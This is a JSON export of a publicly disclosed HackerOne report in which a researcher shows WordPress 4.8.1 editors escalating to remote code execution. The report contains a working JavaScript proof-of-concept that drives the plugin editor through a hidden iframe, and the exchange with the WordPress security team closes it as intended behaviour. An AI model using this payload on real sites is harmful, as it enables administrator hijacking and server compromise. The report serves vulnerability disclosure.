{
    "abilities": {
        "can_manage_common_responses?": false, 
        "can_manage_collaborators?": false, 
        "can_reopen?": false, 
        "can_ban_researcher?": false, 
        "can_create_severity?": false, 
        "can_assign_to_h1_triage?": false, 
        "can_agree_on_going_public?": false, 
        "assignable_team_member_groups": [], 
        "can_view_credential_account_details?": false, 
        "can_export?": false, 
        "can_create_retest?": false, 
        "can_assign_to_user?": false, 
        "can_use_common_responses?": false, 
        "can_hide_timeline?": false, 
        "can_be_manually_disclosed?": false, 
        "assignable_team_members": [], 
        "can_clone?": false, 
        "can_be_publicly_disclosed?": false, 
        "can_close_comments?": false, 
        "can_view_bounty_weights?": false, 
        "can_suggest_bounty_amount?": false, 
        "can_cancel_disclosure_request?": false, 
        "can_redact?": false, 
        "can_change_structured_scope?": false, 
        "can_post_internal_comments?": false, 
        "can_change_state?": false, 
        "can_change_weakness?": false, 
        "can_add_comment?": false, 
        "can_reassign_to_team?": false, 
        "can_change_title?": false, 
        "can_award_bounty?": false, 
        "can_award_swag?": false, 
        "can_close?": false, 
        "can_manage?": false
    }, 
    "comments_closed?": false, 
    "substate": "informative", 
    "bug_reporter_agreed_on_going_public_at": "2017-09-06T09:01:25.027Z", 
    "voters": [
        "skansing", 
        "nxqp", 
        "hyper_warrior", 
        "expensivepasta"
    ], 
    "facebook_team?": false, 
    "has_bounty?": false, 
    "rejected_anc_report_that_can_be_sent_back_to_anc_triagers?": false, 
    "original_report_id": null, 
    "id": 263718, 
    "can_view_team": true, 
    "team_member_agreed_on_going_public_at": "2017-10-04T18:53:41.316Z", 
    "vulnerability_information": "#Background\nThis report is mainly about how a user with the role of editor, expectedly can post unfiltered content\nbut unexpectedly can pwn an administrator with a RCE chain due to same origin frame scripting.\n\nSecondarily the report wants to highlight the technique used and the severity of it.\n\n#Description\nDuring my research I found that a XSS can, in the majority of cases, trivially be turned\ninto a RCE, by abusing same origin frame scripting in the XSS payload.\n\nI demonstrated this \"technique\" in #263058 and #263109 (no need to read, there a POC in this report).\nIt can be used to do *almost* any action from the victims perspective, like adding an administrator or editing a plugin file.\nThis adds to the severity of XSS in core wp, themes and especially plugins.\n\nIt affect the understanding of the user role 'editor' and the ability to post unfiltered content\nhttps://make.wordpress.org/core/handbook/testing/reporting-security-vulnerabilities/#why-are-some-users-allowed-to-post-unfiltered-html\n\nAn editor is a copy-paste and a administrator visit from RCE or performing any action.\nEditors users / accounts them self are more attractive for cracking and social engineering.\nAdministrators are not aware of the risk associated with giving a user editor role or being a editor.\nAll future reports with XSS can be escalated to RCE resulting in increased severity.\n\n\n# POC\nThis POC explores a rogue editor planting payload to RCE.\n\n- Login as editor\n- Upload a .html or plant the POC payload in content\n- Login as administrator visit a link containing the payload\n\n# POC Payload\nThe payload opens the plugin editor, edits a file and redirects to the edited file afterwards\n\n```\n<iframe src=\"http://127.0.0.1:8090/wp-admin/plugin-editor.php?file=hello.php\" style=\"opacity:0\">\n</iframe>\n<script>\nsetTimeout(function() {\n  var p = \"<?php phpinfo();\"\n  // full read/write control over dom, do anything(!)\n  var d = document.querySelector(\"iframe\").contentWindow.document;\n  var c = d.querySelector(\"#newcontent\")\n  var s = d.querySelector(\"#submit\")\n  c.value = p\n  s.click();\n}, 2000);\nsetTimeout(function() {\n  window.location.href = \"http://127.0.0.1:8090/wp-content/plugins/hello.php\"\n}, 4000);\n</script>\n```\n\n# Suggested Fix\nthe role editor should loose all privileges that can lead to scripting\n\nconsideration on hardening could be doing a BC break and switching to `x-frame-options: deny`.\nHowever that can by bypassed by using `window.open(...)` instead of an iframe, but requires\nthe victim to click on the page after opening it. so this will only harden a bit.\n\nanother hardening option could be requiring password on critical actions such as\nplugin install, file edit, etc. it will however have an impact on accessibility and\nit might take time to find all the loop holes.\n", 
    "activity_page_count": 1, 
    "severity": {
        "rating": "high", 
        "author_type": "User"
    }, 
    "title": "Wordpress 4.8.1 - Rogue editor leads to RCE. And the risks of same origin frame scripting in general", 
    "is_member_of_team?": null, 
    "vote_count": 4, 
    "summaries": [
        {
            "category": "team", 
            "can_create?": false, 
            "can_view?": true
        }, 
        {
            "category": "researcher", 
            "can_create?": false, 
            "can_view?": true
        }
    ], 
    "structured_scope": null, 
    "allow_singular_disclosure_at": null, 
    "state": "Closed", 
    "cve_ids": [], 
    "activity_page_number": 1, 
    "readable_substate": "Informative", 
    "public": true, 
    "singular_disclosure_disabled": true, 
    "activities": [
        {
            "automated_response": false, 
            "created_at": "2017-08-27T01:57:38.533Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-08-27T01:57:38.533Z", 
            "actor": {
                "username": "skansing", 
                "url": "/skansing", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/039/510/35216d41cc708c8a9081fb1d4ea38579153e0864_medium.jpg?1460620858"
                }, 
                "hackerone_triager": false
            }, 
            "additional_data": {
                "new_title": "Wordpress 4.8.1 - Rogue editor leads to RCE. And the risks of same origin frame scripting in general", 
                "old_title": "Wordpress 4.8.1 - Rogue editor leads to RCE and the risks of same origin frame scripting in general"
            }, 
            "team_handle": "wordpress", 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::ReportTitleUpdated", 
            "id": 1957725, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2017-09-06T00:51:38.593Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-09-06T00:51:38.593Z", 
            "actor": {
                "username": "johnbillion", 
                "url": "/johnbillion", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/014/083/d2aa5d94732da736a08f022dba3f393e01312ee6_medium.jpg?1484683288"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "wordpress", 
            "message": "Thanks for your report, @skansing, and thanks for your continued interest in keeping WordPress secure via this ticket and your others.\n\nWhile your report is technically valid, this is an intentional design decision of the software. Editors are trusted users, hence they are allowed to publish unfiltered content that includes JavaScript. Your report doesn't include anything that isn't already covered in the core handbook document that you linked to.\n\nRegarding an `X-Frame-Options` header, this is considered out of scope of the H1 program because the headers that WordPress currently sends are considered a good balance of security and functionality. As you noted, changing from `X-Frame-Options: sameorigin` (the current header sent within `wp-admin`) to `X-Frame-Options: deny` would be a breaking change and would not provide a complete fix for the issue of Editors and Administrators attacking one another.\n\nYour point about requiring re-authentication as a form of intent checking is a good one. That said, there has been little interest in implementing such a feature, and plugins which provide this feature haven't gained much traction. Check out https://core.trac.wordpress.org/ticket/31779 and https://core.trac.wordpress.org/ticket/20140, and in particular the plugins linked in the comments near the bottom of the thread.", 
            "markdown_message": "<p>Thanks for your report, <a href=\"/skansing\">@skansing</a>, and thanks for your continued interest in keeping WordPress secure via this ticket and your others.</p>\n\n<p>While your report is technically valid, this is an intentional design decision of the software. Editors are trusted users, hence they are allowed to publish unfiltered content that includes JavaScript. Your report doesn&#39;t include anything that isn&#39;t already covered in the core handbook document that you linked to.</p>\n\n<p>Regarding an <code>X-Frame-Options</code> header, this is considered out of scope of the H1 program because the headers that WordPress currently sends are considered a good balance of security and functionality. As you noted, changing from <code>X-Frame-Options: sameorigin</code> (the current header sent within <code>wp-admin</code>) to <code>X-Frame-Options: deny</code> would be a breaking change and would not provide a complete fix for the issue of Editors and Administrators attacking one another.</p>\n\n<p>Your point about requiring re-authentication as a form of intent checking is a good one. That said, there has been little interest in implementing such a feature, and plugins which provide this feature haven&#39;t gained much traction. Check out <a title=\"https://core.trac.wordpress.org/ticket/31779\" href=\"/redirect?signature=369c1fd09bf2d86715c319ccae7d2b1a5a8baba5&amp;url=https%3A%2F%2Fcore.trac.wordpress.org%2Fticket%2F31779\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://core.trac.wordpress.org/ticket/31779</span><i class=\"icon-external-link\"></i></a> and <a title=\"https://core.trac.wordpress.org/ticket/20140\" href=\"/redirect?signature=917c37c3d2024aa220fb70e3c1ef598efe38c591&amp;url=https%3A%2F%2Fcore.trac.wordpress.org%2Fticket%2F20140\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://core.trac.wordpress.org/ticket/20140</span><i class=\"icon-external-link\"></i></a>, and in particular the plugins linked in the comments near the bottom of the thread.</p>\n", 
            "type": "Activities::BugInformative", 
            "id": 1978749, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2017-09-06T09:00:59.541Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-09-06T09:07:34.609Z", 
            "actor": {
                "username": "skansing", 
                "url": "/skansing", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/039/510/35216d41cc708c8a9081fb1d4ea38579153e0864_medium.jpg?1460620858"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "wordpress", 
            "message": "Hi @johnbillion ,\n\nThanks for reviewing this bug. I knew at the time of the writting that this was a known feature (unfilted_html) that you also get a lot of noise in on, dublicates etc, but thought a *clear RCE chain* would help asses this at a proper severity. \n\nThe two links provided does not really have a proper security angle on it and hence are really useless to educate or handle the problem at hand.\n\nAlso my point on \"X-Frame-Option\" was not a suggestion to implement it, it was to point out that It would not migrate the problem completely as the attacker can do cross frame scripting from tab to tab via window.open.\n\nIt is nowhere known for consumers of WP that adding a editor is a open portal to RCE and *the dangers are down played* in the docs such as https://codex.wordpress.org/Hardening_WordPress , concepts such as \"Least Privilege Principle\" and \"Defense in Depth\" falls apart in light of such vector. I also read (cant find it know) a area that leaves the user the impression that the XSS from a editor cant do any really damage (which is ofc wrong (= )\n\nWhen unfiltered html means RCE in 6 lines of JS then this is something consumers should be aware of and which  wp shouldnt neglect/accept in a time where a WP RCE pays 50.000 $ at zerodium. \n\n\n\nLet make this public, this way consumers have reference that role editor or anything that gives unfiltered_html is stone throw away from a RCE. This would also give new bug hunters the possibility to escalate to RCE on any XSS. \n\nSo any XSS bug would be same bounty/severity as https://hackerone.com/reports/149589 I would presume, as the entry level is easier but the severity is harder.", 
            "markdown_message": "<p>Hi <a href=\"/johnbillion\">@johnbillion</a> ,</p>\n\n<p>Thanks for reviewing this bug. I knew at the time of the writting that this was a known feature (unfilted_html) that you also get a lot of noise in on, dublicates etc, but thought a <em>clear RCE chain</em> would help asses this at a proper severity. </p>\n\n<p>The two links provided does not really have a proper security angle on it and hence are really useless to educate or handle the problem at hand.</p>\n\n<p>Also my point on &quot;X-Frame-Option&quot; was not a suggestion to implement it, it was to point out that It would not migrate the problem completely as the attacker can do cross frame scripting from tab to tab via window.open.</p>\n\n<p>It is nowhere known for consumers of WP that adding a editor is a open portal to RCE and <em>the dangers are down played</em> in the docs such as <a title=\"https://codex.wordpress.org/Hardening_WordPress\" href=\"/redirect?signature=21a1cb3e2dfa5e30eecc639630e5e179f1fd070d&amp;url=https%3A%2F%2Fcodex.wordpress.org%2FHardening_WordPress\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://codex.wordpress.org/Hardening_WordPress</span><i class=\"icon-external-link\"></i></a> , concepts such as &quot;Least Privilege Principle&quot; and &quot;Defense in Depth&quot; falls apart in light of such vector. I also read (cant find it know) a area that leaves the user the impression that the XSS from a editor cant do any really damage (which is ofc wrong (= )</p>\n\n<p>When unfiltered html means RCE in 6 lines of JS then this is something consumers should be aware of and which  wp shouldnt neglect/accept in a time where a WP RCE pays 50.000 $ at zerodium. </p>\n\n<p>Let make this public, this way consumers have reference that role editor or anything that gives unfiltered_html is stone throw away from a RCE. This would also give new bug hunters the possibility to escalate to RCE on any XSS. </p>\n\n<p>So any XSS bug would be same bounty/severity as <a title=\"https://hackerone.com/reports/149589\" href=\"https://hackerone.com/reports/149589\">https://hackerone.com/reports/149589</a> I would presume, as the entry level is easier but the severity is harder.</p>\n", 
            "type": "Activities::Comment", 
            "id": 1979229, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2017-09-06T09:01:25.041Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-09-06T09:01:25.041Z", 
            "actor": {
                "username": "skansing", 
                "url": "/skansing", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/039/510/35216d41cc708c8a9081fb1d4ea38579153e0864_medium.jpg?1460620858"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "wordpress", 
            "first_to_agree": true, 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::AgreedOnGoingPublic", 
            "id": 1979230, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2017-09-06T09:21:42.744Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-09-06T09:30:04.121Z", 
            "actor": {
                "username": "skansing", 
                "url": "/skansing", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/039/510/35216d41cc708c8a9081fb1d4ea38579153e0864_medium.jpg?1460620858"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "wordpress", 
            "message": "```\nIf you are running security tests against WordPress, use a lesser privileged user so that all content is filtered. If you\n are concerned about an Administrator putting XSS into content and stealing cookies, note that all cookies are\n marked for HTTP only delivery, and are divided into privileged cookies used for admin pages, and unprivileged\n cookies used for public facing pages. Content is never displayed unfiltered within the admin dashboard. Regardless,\n an Administrator has wide-ranging super powers, among which unfiltered HTML is a lesser one.\n```\n\nNotice how this text misinforms the dangers of unfiltered html and XSS in general.  And we are really concerned with the *editor*, not a administrator. With the POC chain explained, the attacker can do anything in lieu of the victim, there is no need for the attacker to get their cookies or etc, they can perform an attack as the payload trigger that bypass any need for stealing cookies/sessions.", 
            "markdown_message": "<pre class=\"highlight plaintext\"><code>If you are running security tests against WordPress, use a lesser privileged user so that all content is filtered. If you\n are concerned about an Administrator putting XSS into content and stealing cookies, note that all cookies are\n marked for HTTP only delivery, and are divided into privileged cookies used for admin pages, and unprivileged\n cookies used for public facing pages. Content is never displayed unfiltered within the admin dashboard. Regardless,\n an Administrator has wide-ranging super powers, among which unfiltered HTML is a lesser one.\n</code></pre>\n<p>Notice how this text misinforms the dangers of unfiltered html and XSS in general.  And we are really concerned with the <em>editor</em>, not a administrator. With the POC chain explained, the attacker can do anything in lieu of the victim, there is no need for the attacker to get their cookies or etc, they can perform an attack as the payload trigger that bypass any need for stealing cookies/sessions.</p>\n", 
            "type": "Activities::Comment", 
            "id": 1979254, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2017-09-06T09:39:53.149Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-09-06T09:44:29.499Z", 
            "actor": {
                "username": "skansing", 
                "url": "/skansing", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/039/510/35216d41cc708c8a9081fb1d4ea38579153e0864_medium.jpg?1460620858"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "wordpress", 
            "message": "An example of a report which was deemed low severity but could have lead to a RCE (https://hackerone.com/reports/253313) could easily have been escalated to RCE as the XSS has a lot higher impact than described. From the docs and reports (severity given / impact given in bounties) I would say most are not aware of this.", 
            "markdown_message": "<p>An example of a report which was deemed low severity but could have lead to a RCE (<a title=\"https://hackerone.com/reports/253313\" href=\"https://hackerone.com/reports/253313\">https://hackerone.com/reports/253313</a>) could easily have been escalated to RCE as the XSS has a lot higher impact than described. From the docs and reports (severity given / impact given in bounties) I would say most are not aware of this.</p>\n", 
            "type": "Activities::Comment", 
            "id": 1979274, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2017-10-04T18:53:41.332Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-10-04T18:53:41.332Z", 
            "actor": {
                "username": "johnbillion", 
                "url": "/johnbillion", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/014/083/d2aa5d94732da736a08f022dba3f393e01312ee6_medium.jpg?1484683288"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "wordpress", 
            "message": "The security team are disclosing this issue publicly because the information contained within could be educational to users, but it does not expose any behaviour that is not already known and expected. Editors are -- and always have been -- considered trusted users, hence their ability to publish unfiltered content.\n\nThanks again for your interest in keeping WordPress secure, @skansing.", 
            "markdown_message": "<p>The security team are disclosing this issue publicly because the information contained within could be educational to users, but it does not expose any behaviour that is not already known and expected. Editors are -- and always have been -- considered trusted users, hence their ability to publish unfiltered content.</p>\n\n<p>Thanks again for your interest in keeping WordPress secure, <a href=\"/skansing\">@skansing</a>.</p>\n", 
            "type": "Activities::AgreedOnGoingPublic", 
            "id": 2044017, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2017-10-04T18:53:41.386Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-10-04T18:53:41.386Z", 
            "actor": {
                "username": "johnbillion", 
                "url": "/johnbillion", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/014/083/d2aa5d94732da736a08f022dba3f393e01312ee6_medium.jpg?1484683288"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "wordpress", 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::ReportBecamePublic", 
            "id": 2044018, 
            "genius_execution_id": null
        }
    ], 
    "in_validation?": false, 
    "is_participant": false, 
    "reporter": {
        "username": "skansing", 
        "hacker_mediation": false, 
        "hackerone_triager": false, 
        "disabled": false, 
        "url": "/skansing", 
        "profile_picture_urls": {
            "small": "https://profile-photos.hackerone-user-content.com/000/039/510/91bea0e997720e8fa5454c81c61c2da28fe638e3_small.jpg?1460620858"
        }, 
        "is_me?": false
    }, 
    "is_external_bug": false, 
    "visibility": "full", 
    "disclosed_at": "2017-10-04T18:53:41.370Z", 
    "stage": 4, 
    "url": "https://hackerone.com/reports/263718", 
    "created_at": "2017-08-27T01:55:26.996Z", 
    "original_report_url": null, 
    "vulnerability_information_html": "<h1 id=\"background\">Background</h1>\n\n<p>This report is mainly about how a user with the role of editor, expectedly can post unfiltered content<br>\nbut unexpectedly can pwn an administrator with a RCE chain due to same origin frame scripting.</p>\n\n<p>Secondarily the report wants to highlight the technique used and the severity of it.</p>\n\n<h1 id=\"description\">Description</h1>\n\n<p>During my research I found that a XSS can, in the majority of cases, trivially be turned<br>\ninto a RCE, by abusing same origin frame scripting in the XSS payload.</p>\n\n<p>I demonstrated this &quot;technique&quot; in <a href=\"/reports/263058\">#263058</a> and <a href=\"/reports/263109\">#263109</a> (no need to read, there a POC in this report).<br>\nIt can be used to do <em>almost</em> any action from the victims perspective, like adding an administrator or editing a plugin file.<br>\nThis adds to the severity of XSS in core wp, themes and especially plugins.</p>\n\n<p>It affect the understanding of the user role &#39;editor&#39; and the ability to post unfiltered content<br>\n<a title=\"https://make.wordpress.org/core/handbook/testing/reporting-security-vulnerabilities/#why-are-some-users-allowed-to-post-unfiltered-html\" href=\"/redirect?signature=050339bc34b50bf05731956395d49957eedba1ab&amp;url=https%3A%2F%2Fmake.wordpress.org%2Fcore%2Fhandbook%2Ftesting%2Freporting-security-vulnerabilities%2F%23why-are-some-users-allowed-to-post-unfiltered-html\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://make.wordpress.org/core/handbook/testing/reporting-security-vulnerabilities/#why-are-some-users-allowed-to-post-unfiltered-html</span><i class=\"icon-external-link\"></i></a></p>\n\n<p>An editor is a copy-paste and a administrator visit from RCE or performing any action.<br>\nEditors users / accounts them self are more attractive for cracking and social engineering.<br>\nAdministrators are not aware of the risk associated with giving a user editor role or being a editor.<br>\nAll future reports with XSS can be escalated to RCE resulting in increased severity.</p>\n\n<h1 id=\"poc\">POC</h1>\n\n<p>This POC explores a rogue editor planting payload to RCE.</p>\n\n<ul>\n<li>Login as editor</li>\n<li>Upload a .html or plant the POC payload in content</li>\n<li>Login as administrator visit a link containing the payload</li>\n</ul>\n\n<h1 id=\"poc-payload\">POC Payload</h1>\n\n<p>The payload opens the plugin editor, edits a file and redirects to the edited file afterwards</p>\n<pre class=\"highlight plaintext\"><code>&lt;iframe src=&quot;http://127.0.0.1:8090/wp-admin/plugin-editor.php?file=hello.php&quot; style=&quot;opacity:0&quot;&gt;\n&lt;/iframe&gt;\n&lt;script&gt;\nsetTimeout(function() {\n  var p = &quot;&lt;?php phpinfo();&quot;\n  // full read/write control over dom, do anything(!)\n  var d = document.querySelector(&quot;iframe&quot;).contentWindow.document;\n  var c = d.querySelector(&quot;#newcontent&quot;)\n  var s = d.querySelector(&quot;#submit&quot;)\n  c.value = p\n  s.click();\n}, 2000);\nsetTimeout(function() {\n  window.location.href = &quot;http://127.0.0.1:8090/wp-content/plugins/hello.php&quot;\n}, 4000);\n&lt;/script&gt;\n</code></pre>\n<h1 id=\"suggested-fix\">Suggested Fix</h1>\n\n<p>the role editor should loose all privileges that can lead to scripting</p>\n\n<p>consideration on hardening could be doing a BC break and switching to <code>x-frame-options: deny</code>.<br>\nHowever that can by bypassed by using <code>window.open(...)</code> instead of an iframe, but requires<br>\nthe victim to click on the page after opening it. so this will only harden a bit.</p>\n\n<p>another hardening option could be requiring password on critical actions such as<br>\nplugin install, file edit, etc. it will however have an impact on accessibility and<br>\nit might take time to find all the loop holes.</p>\n", 
    "severity_rating": "high", 
    "team_private?": false, 
    "team": {
        "profile": {
            "website": "https://wordpress.org/", 
            "about": "Beautiful sites of any kind.", 
            "twitter_handle": "wordpress", 
            "name": "WordPress"
        }, 
        "handle": "wordpress", 
        "url": "https://hackerone.com/wordpress", 
        "state": "public_mode", 
        "profile_picture_urls": {
            "small": "https://profile-photos.hackerone-user-content.com/000/000/055/2ded484d947025dc191342c9ccdcf00effc53ff6_small.jpg?1392934661", 
            "medium": "https://profile-photos.hackerone-user-content.com/000/000/055/a7e722c23dedc020ade3b6e7f1a96baa455f86d8_medium.jpg?1392934661"
        }, 
        "awards_miles": false, 
        "permissions": [], 
        "id": 55, 
        "default_currency": "usd"
    }, 
    "is_published": false
}